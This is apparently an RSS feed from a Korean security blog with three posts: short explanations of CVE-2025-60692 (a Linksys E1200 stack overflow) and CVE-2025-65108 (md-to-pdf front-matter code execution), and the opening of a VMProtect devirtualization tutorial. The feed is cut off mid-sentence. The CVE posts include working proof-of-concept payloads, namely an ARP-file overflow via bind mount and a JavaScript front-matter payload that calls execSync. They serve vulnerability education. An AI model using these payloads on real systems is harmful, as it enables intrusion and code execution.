<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 17 Dec 2025 12:47:52 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-60692: Cisco Linksys E1200 v2의 Buffer over flow로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/</link>
      <guid>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/</guid>
      <pubDate>Wed, 17 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-60692&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-60692">https://nvd.nist.gov/vuln/detail/CVE-2025-60692</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Linksys E1200 v2</li><li>Firmware: E1200_v2.0.11.001_us</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-60692&#xB294; Cisco &#xC0AC;&#xC758; Linksys E1200 &#xB77C;&#xC6B0;&#xD130;&#xC758;  <code>libshared.so</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Stack-Based Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>httpd</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xC778; <code>get_mac_from_ip()</code>, <code>get_ip_from_mac()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> listen4_fd;    <span class="hljs-keyword">int</span> conn_fd;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client_addr</span>;</span>    <span class="hljs-keyword">socklen_t</span> addr_len;    <span class="hljs-comment">/* --- socket initialization / SSL setup / daemonize --- */</span>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        <span class="hljs-comment">/* IPv4 socket accept */</span>        conn_fd = accept(listen4_fd, &amp;client_addr, &amp;addr_len);        <span class="hljs-keyword">if</span> (conn_fd &lt; <span class="hljs-number">0</span>)            <span class="hljs-keyword">continue</span>;        settimeouts(conn_fd, timeout_secs);        <span class="hljs-comment">/* &#xCDE8;&#xC57D; &#xACBD;&#xB85C; &#xC9C4;&#xC785; */</span>        get_client_ip_mac(conn_fd, &amp;client_addr);        fdopen(conn_fd, <span class="hljs-string">&quot;r+&quot;</span>);        ...    }}</code></pre><pre><code class="hljs c"><span class="hljs-function">FILE *__fastcall <span class="hljs-title">get_client_ip_mac</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct sockaddr *addr)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> family;    <span class="hljs-keyword">char</span> ip_str[<span class="hljs-number">46</span>];    family = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> *)addr;    <span class="hljs-comment">/* IPv4 */</span>    <span class="hljs-keyword">if</span> (family == AF_INET) {        inet_ntop(AF_INET, addr + <span class="hljs-number">1</span>, ip_str, <span class="hljs-keyword">sizeof</span>(ip_str));        <span class="hljs-keyword">if</span> (!nvram_get(<span class="hljs-string">&quot;http_client_ip&quot;</span>) ||            <span class="hljs-built_in">strcmp</span>(nvram_get(<span class="hljs-string">&quot;http_client_ip&quot;</span>), ip_str)) {            nvram_set(<span class="hljs-string">&quot;http_client_ip&quot;</span>, ip_str);        }        <span class="hljs-comment">/* &#xCDE8;&#xC57D; &#xD568;&#xC218; &#xD638;&#xCD9C; */</span>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mac = get_mac_from_ip(ip_str);        <span class="hljs-keyword">if</span> (!nvram_get(<span class="hljs-string">&quot;http_client_mac&quot;</span>) ||            <span class="hljs-built_in">strcmp</span>(nvram_get(<span class="hljs-string">&quot;http_client_mac&quot;</span>), mac)) {            nvram_set(<span class="hljs-string">&quot;http_client_mac&quot;</span>, mac);        }        use_lan = legal_ip_netmask(...);        <span class="hljs-keyword">return</span> ...;    }}</code></pre><p><code>main</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; client&#xC640; &#xC5F0;&#xACB0;&#xC744; &#xB9FA;&#xC5B4; <code>Accept()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>get_client_ip_mac</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xC778; <code>get_mac_from_ip()</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="libshared-so"><a href="#libshared-so" class="headerlink" title="libshared.so"></a>libshared.so</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">get_mac_from_ip</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip)</span></span><span class="hljs-function"></span>{    FILE *fp;    <span class="hljs-keyword">char</span> v6[<span class="hljs-number">50</span>];     <span class="hljs-comment">// IP field</span>    <span class="hljs-keyword">char</span> v7[<span class="hljs-number">150</span>];    <span class="hljs-comment">// MAC + padding</span>    <span class="hljs-keyword">char</span> line[<span class="hljs-number">104</span>];  <span class="hljs-comment">// fgets buffer</span>    <span class="hljs-keyword">char</span> flags1;    <span class="hljs-keyword">char</span> flags2;    fp = fopen(<span class="hljs-string">&quot;/proc/net/arp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (!fp)        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">if</span> (fgets(line, <span class="hljs-number">100</span>, fp)) {        <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-number">100</span>, fp)) {        <span class="hljs-comment">// VULNERABILITY : Buffer Over Flow</span>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(                    line,                    <span class="hljs-string">&quot;%s 0x%x 0x%x %100s %100s %100s\n&quot;</span>,                    v6,                              &amp;flags1,                    &amp;flags2,                    v7,                    &amp;v7[<span class="hljs-number">50</span>],                    &amp;v7[<span class="hljs-number">100</span>]                ) == <span class="hljs-number">6</span> &amp;&amp;                !<span class="hljs-built_in">strcmp</span>(ip, v6)) {                <span class="hljs-built_in">strcpy</span>(mac_7685, v7);                fclose(fp);                <span class="hljs-keyword">return</span> mac_7685;            }        }    }    fclose(fp);    <span class="hljs-keyword">return</span> default_mac;}</code></pre><p>&#xC774;&#xD6C4; <code>libshared.so</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>get_mac_from_ip()</code>, <code>get_ip_from_mac()</code> &#xB294; <code>/proc/net/arp</code> &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC785;&#xB825; &#xAE38;&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>sscanf()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">&quot;%s 0x%x 0x%x %100s %100s %100s\n&quot;</span>,                    v6,                              &amp;flags1,                    &amp;flags2,                    v7,                    &amp;v7[<span class="hljs-number">50</span>],                    &amp;v7[<span class="hljs-number">100</span>]                )</code></pre><p><code>v6</code> &#xBC84;&#xD37C;&#xB294; &#xD06C;&#xAE30;&#xAC00; 50&#xBC14;&#xC774;&#xD2B8;&#xC784;&#xC5D0;&#xB3C4; %s&#xC5D0; &#xB300;&#xD55C; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC73C;&#xBA70;, <code>v7</code> &#xC5ED;&#xC2DC; 150&#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;&#xC5D0; &#xB300;&#xD574; &#xCD5C;&#xB300; 300&#xBC14;&#xC774;&#xD2B8;&#xAE4C;&#xC9C0; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xBD84;&#xD560;&#xB418;&#xC5B4; &#xC788;&#xC5B4; Stack-Based Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/17/barrack/CVE-2025-60692/1.png" alt></p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; <code>/proc/net/arp</code> &#xB0B4;&#xC6A9;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD658;&#xACBD;(&#xB85C;&#xCEEC; &#xC811;&#xADFC; &#xB610;&#xB294; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xC870;&#xC791;)&#xC774;&#xBA74; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC2DC; &#xC2A4;&#xD0DD; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC774;&#xB294; DOS &#xD639;&#xC740; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>&#xACF5;&#xAC1C;&#xB41C; POC &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">echo -e <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x1 0x2 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 0x0 0x0&quot;</span> &gt; /tmp/fake_arpmount --bind /tmp/fake_arp /proc/net/arp</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/yifan20020708/SGTaint-0-day/blob/main/Linksys/Linksys-E1200/CVE-2025-60692.md">https://github.com/yifan20020708/SGTaint-0-day/blob/main/Linksys/Linksys-E1200/CVE-2025-60692.md</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Cisco/">Cisco</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linksys/">Linksys</category>
      
      <category domain="https://hackyboiz.github.io/tags/E1200-v2-router/">E1200 v2 router</category>
      
      <category domain="https://hackyboiz.github.io/tags/buffer-over-flow/">buffer over flow</category>
      
      <category domain="https://hackyboiz.github.io/tags/barrack/">barrack</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/17/barrack/CVE-2025-60692/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-65108: md-to-pdf의 Front matter 취약점을 통한 RCE</title>
      <link>https://hackyboiz.github.io/2025/12/13/bekim/2025-12-13/</link>
      <guid>https://hackyboiz.github.io/2025/12/13/bekim/2025-12-13/</guid>
      <pubDate>Sat, 13 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/simonhaenisch/md-to-pdf/security</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/simonhaenisch/md-to-pdf/security/advisories/GHSA-547r-qmjm-8hvw">https://github.com/simonhaenisch/md-to-pdf/security/advisories/GHSA-547r-qmjm-8hvw</a></li><li><a href="https://www.tenable.com/cve/CVE-2025-65108">https://www.tenable.com/cve/CVE-2025-65108</a></li></ul><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><ul><li>md-to-pdf &lt;5.2.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Markdown &#xD30C;&#xC77C;&#xC744; HTML&#xB85C; &#xB80C;&#xB354;&#xB9C1;&#xD55C; &#xB4A4;, headless Chrome&#xC744; &#xC0AC;&#xC6A9;&#xD574; PDF&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; Node.js &#xAE30;&#xBC18; &#xB3C4;&#xAD6C;&#xC778; md-to-pdf&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2025-65108&#xC740; md-to-pdf&#xAC00; Markdown &#xD30C;&#xC77C;&#xC758; front-matter(YAML &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;)&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">---title: &#xD0C0;&#xC774;&#xD2C0;slug: main---</code></pre><p>Markdown &#xD30C;&#xC77C;&#xC758; front-matter&#xB294; &#xBCF4;&#xD1B5; <code>---</code> &#xB85C; &#xB458;&#xB7EC;&#xC2F8;&#xC778; YAML &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC73C;&#xB85C;, md-to-pdf&#xB294; &#xC774;&#xB97C; gray-matter &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD30C;&#xC2F1;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; gray-matter&#xAC00; &#xAE30;&#xBCF8; yaml &#xAD6C;&#xBD84;&#xC790; &#xC678;&#xC5D0;&#xB3C4; &#x2014;-json, &#x2014;-javascript&#xC640; &#xAC19;&#xC740; delimiter&#xB3C4; &#xC9C0;&#xC6D0;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xBA70;, &#xC774;&#xB7EC;&#xD55C; delimiter&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xBA74; front-matter &#xB0B4;&#xC6A9;&#xC744; &#xD574;&#xB2F9; &#xC5B8;&#xC5B4;(JavaScript &#xB4F1;)&#xB85C; &#xD3C9;&#xAC00;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>md-to-pdf&#xB294; &#xD30C;&#xC2F1;&#xB41C; front-matter&#xB97C; &#xCD94;&#xAC00; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xD15C;&#xD50C;&#xB9BF; &#xC5D4;&#xC9C4;&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC870;&#xC791;&#xB41C; Markdown &#xD30C;&#xC77C;&#xB9CC; &#xC5C5;&#xB85C;&#xB4DC;&#xD574;&#xB3C4; &#xBCC0;&#xD658; &#xACFC;&#xC815;&#xC5D0;&#xC11C; JavaScript &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="hljs jsx"><span class="hljs-comment">// [1]</span><span class="hljs-keyword">const</span> { mdToPdf } = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;md-to-pdf&apos;</span>);<span class="hljs-comment">// [2]</span><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&apos;---javascript\n((require(&quot;child_process&quot;)).execSync(&quot;calc.exe&quot;))\n---RCE&apos;</span>;<span class="hljs-comment">// [3]</span>(<span class="hljs-keyword">async</span> () =&gt; {<span class="hljs-keyword">await</span> mdToPdf({ <span class="hljs-attr">content</span>: payload }, { <span class="hljs-attr">dest</span>: <span class="hljs-string">&apos;./output.pdf&apos;</span>});})();</code></pre><p>[1]  Markdown &#xBB38;&#xC790;&#xC5F4;&#xC744; HTML &#x2192; PDF&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; <code>md-to-pdf</code> &#xBAA8;&#xB4C8;&#xC744; &#xBD88;&#xB7EC;&#xC624;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB54C;, [2] payload &#xBCC0;&#xC218;&#xC5D0;&#xB294; JavaScript front-matter (&#x2014;-javascript)&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xB0B4;&#xC6A9;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xACE0;, gray-matter&#xAC00; &#xC774; &#xAD6C;&#xBD84;&#xC790;&#xB97C; &#xB9CC;&#xB098;&#xBA74;, front-matter &#xB0B4;&#xBD80;&#xC758; &#xB0B4;&#xC6A9;&#xC744; javascript &#xCF54;&#xB4DC;&#xB85C; &#xD3C9;&#xAC00;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.  (ex. Node.js&#xC758; child_process &#xBAA8;&#xB4C8; &#xD638;&#xCD9C;)</p><p>&#xB9CC;&#xC57D; [3] async  &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; <code>mdToPdf()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xBCC0;&#xD658; &#xACFC;&#xC815;&#xC5D0;&#xC11C; front-matter&#xAC00; &#xD30C;&#xC2F1;&#xB418;&#xBA70;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; Markdown &#x2192; PDF &#xBCC0;&#xD658;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; Node.js &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.purple-ops.io/resources-hottest-cves/markdown-pdf-rce-cve2025/">https://www.purple-ops.io/resources-hottest-cves/markdown-pdf-rce-cve2025/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-65108/">CVE-2025-65108</category>
      
      <category domain="https://hackyboiz.github.io/tags/md-to-pdf/">md-to-pdf</category>
      
      <category domain="https://hackyboiz.github.io/tags/gray-matter/">gray-matter</category>
      
      <category domain="https://hackyboiz.github.io/tags/Node-js/">Node.js</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/13/bekim/2025-12-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] VMProtect Devirtualization: Part 2 (EN)</title>
      <link>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/en/</link>
      <guid>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/en/</guid>
      <pubDate>Thu, 11 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2025/12/11/banda/VM</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><img src="/2025/12/11/banda/VMPpart2/en/main.png" alt></p><p>Hi, this is banda. :)</p><p>Thank you for giving VMProtect Part 1 more attention than I expected. But I still crave even more attention, so I am back with VMProtect Part 2. In line with the theory-oriented flow of the previous write-up, I wanted Part 2 to extend into a more real-world setting. This time, together with static analysis, we will actually decode functions virtualized by VMProtect 3 into a devirtualized binary / restored code and walk through that process as a hands-on exercise.</p><p>If you have not read it yet, I recommend checking out the previous post first: <a href="https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/">VMProtect Devirtualization Part 1</a>.</p><p>This unpacking article is written purely for educational and research purposes. Please follow ethical guidelines and help keep the ecosystem healthy.</p><h2 id="Devirtualization-Rules"><a href="#Devirtualization-Rules" class="headerlink" title="Devirtualization Rules"></a>Devirtualization Rules</h2><p><img src="/2025/12/11/banda/VMPpart2/en/image1.png" alt></p><p>Before jumping into the challenge, let&#x2019;s briefly recap the basic idea behind virtualization-based obfuscation. Normally, a program runs directly as machine code for a real CPU, such as x86 or x64. Tools like VMProtect or Themida do not leave this code as is. Instead, they:</p><ol><li>Convert original x86 code into a &#x201C;virtual bytecode&#x201D;</li><li>Embed a virtual machine (VM) inside the binary that can interpret this bytecode</li><li>At runtime, the VM executes by fetching and interpreting each bytecode instruction one by one</li></ol><p><strong>VM State Transition</strong></p><p>To understand devirtualization, the key is to focus on &#x201C;what state the VM maintains, and how that state changes when a handler executes.&#x201D; The VM state can be defined as follows:</p><pre><code class="hljs sql">VIP: Virtual Instruction PointerVSP: Virtual Stack PointerVStack: <span class="hljs-keyword">values</span> currently <span class="hljs-keyword">stored</span> <span class="hljs-keyword">on</span> the <span class="hljs-keyword">virtual</span> stackScratch: <span class="hljs-keyword">temporary</span> <span class="hljs-keyword">storage</span>VFlags: <span class="hljs-keyword">virtual</span> flags (playing <span class="hljs-keyword">roles</span> similar <span class="hljs-keyword">to</span> ZF, CF, etc.)</code></pre><p>No matter how heavy the obfuscation is, what ultimately matters is &#x201C;how the bundle of state changes after each handler.&#x201D; You can think of the VM not as a CPU, but as a collection of state-transition functions that take <code>VIP</code>, <code>VStack</code>, <code>Scratch</code>, and <code>VFlags</code> as input and produce new <code>VIP</code>, <code>VStack</code>, <code>Scratch</code>, and <code>VFlags</code> as output.</p><p>When analyzing a handler, instead of trying to understand every single instruction in the disassembly, the important part is to be able to summarize: &#x201C;this handler transforms the VM state in this way.&#x201D; Once you can say that, you have essentially understood that handler&#x2019;s semantics.</p><h2 id="DevirtualizeMe-Challenge-VMP32-v1"><a href="#DevirtualizeMe-Challenge-VMP32-v1" class="headerlink" title="DevirtualizeMe Challenge - VMP32 v1"></a>DevirtualizeMe Challenge - VMP32 v1</h2><p><img src="/2025/12/11/banda/VMPpart2/en/image2.png" alt></p><p>The challenge we will work on here is <a href="https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252">DevirtualizeMe</a> from Tuts4You.</p><p>The program is structured around a C++ class named <code>UnpackMe</code>, and it is protected with VMProtect 3.0.9 using Virtualization mode. The goal of this post is to locate the functions that VMProtect has virtualized inside the attached binary, interpret the bytecode running on top of that VM, and reconstruct the original native-level logic as far as possible. The tools used are IDA, Detect It Easy, Triton, and a custom VMPTrace-style toolchain.</p><h3 id="Challenge-Information"><a href="#Challenge-Information" class="headerlink" title="Challenge Information"></a>Challenge Information</h3><p><strong>Difficulty :</strong> 8</p><p><strong>Language :</strong> C++</p><p><strong>Platform :</strong> Windows x86</p><p><strong>OS Version :</strong> All</p><p><strong>Packer / Protector :</strong> VMProtect 3.0.9</p><p><strong>Unpack goal</strong></p><blockquote><p>From the attached binary (.exe), analyze the virtualized function(s), apply a devirtualization patch, and ensure that the patched program runs without errors.</p></blockquote><p><strong><em>Condition:</em></strong></p><blockquote><p>When you press P, a virtualized function located in the VMP region runs and shows a message box.If the devirtualization has been done correctly (i.e., the original logic is preserved even after patching), running the patched program and pressing P must not produce a crash.</p></blockquote><p><img src="/2025/12/11/banda/VMPpart2/en/image3.png" alt></p><p>If we check the entropy view in DiE, we can see a typical pattern for Virtualization mode. The <code>.text</code> section is obfuscated, and the presence of <code>.vmp0</code> indicates that VMP&#x2019;s core VM bytecode lives there. Entry stub and initialization stub are packed, and the runtime VM engine is expected to reside in <code>.vmp0</code>.</p><p>We will follow the flow <code>WinMain</code> &#x2192; <code>UnpackMe</code> &#x2192; <code>Run</code> and carefully locate where the VMEntry actually is.</p><h3 id="Road-to-VMEntry"><a href="#Road-to-VMEntry" class="headerlink" title="Road to VMEntry"></a>Road to VMEntry</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">WinMain</span><span class="hljs-params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="hljs-keyword">int</span> nShowCmd)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">void</span> (__stdcall ***v4)(HINSTANCE); <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">void</span> (__stdcall ***v5)(HINSTANCE); <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">void</span> (__stdcall **v6)(HINSTANCE); <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  SetUnhandledExceptionFilter(TopLevelExceptionFilter);  v4 = (<span class="hljs-keyword">void</span> (__stdcall ***)(HINSTANCE))<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0x48</span>u);  v5 = v4;  <span class="hljs-keyword">if</span> ( v4 )    *v4 = (<span class="hljs-keyword">void</span> (__stdcall **)(HINSTANCE))&amp;UnpackMe::`vftable<span class="hljs-number">&apos;</span>;  <span class="hljs-comment">// vtable &#xC124;&#xC815;</span>  <span class="hljs-keyword">else</span>    v5 = <span class="hljs-number">0</span>;  v6 = *v5;  UnpackMe* <span class="hljs-keyword">this</span> = v5;  (*v6)(hInstance);   <span class="hljs-comment">// vtable[0] &#xD638;&#xCD9C;</span>  j__free(UnpackMe* <span class="hljs-keyword">this</span>);  <span class="hljs-keyword">return</span> result;}</code></pre><p>A typical virtualization-based obfuscation VM can usually be broken down into the following components:</p><ul><li><p><code>VM Entry</code> / <code>VM Exit</code></p><p>  Entry: the region where native registers and stack state are copied into the VM state</p><p>  Exit: after bytecode execution finishes, the VM state is written back to the original registers and stack</p></li><li><p><code>VM Dispatcher</code></p><p>  Reads the opcode at the virtual PC (<code>VIP</code>), decides which handler to jump to, and repeatedly runs a fetch &#x2192; decode &#x2192; dispatch &#x2192; execute loop</p></li><li><p><code>Handler Table</code></p><p>  A table mapping each opcode to its handler function</p><p>  Each handler implements the semantics of one VM instruction such as &#x201C;virtual ADD&#x201D;, &#x201C;virtual XOR&#x201D;, or &#x201C;virtual branch&#x201D;</p></li></ul><p>For a real-world challenge like DevirtualizeMe, the first step is to locate the VMEntry. Only after finding the VMEntry can we reason about the VM state layout; I will discuss the VM state in more detail later.</p><p>The <code>WinMain()</code> function itself is structurally simple. From a devirtualization perspective, note that VMP usually virtualizes only certain target functions and leaves the path leading up to those functions in normal C++ code. So here we just need to confirm that <code>vtable[0]</code> is in fact <code>UnpackMe::Run</code> and then move on.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image4.png" alt></p><p>Following the vtable, we find that the C++ class <code>UnpackMe</code>&#x2019;s vtable lives in the <code>.rdata</code> section. When IDA successfully reconstructs RTTI, it attaches the 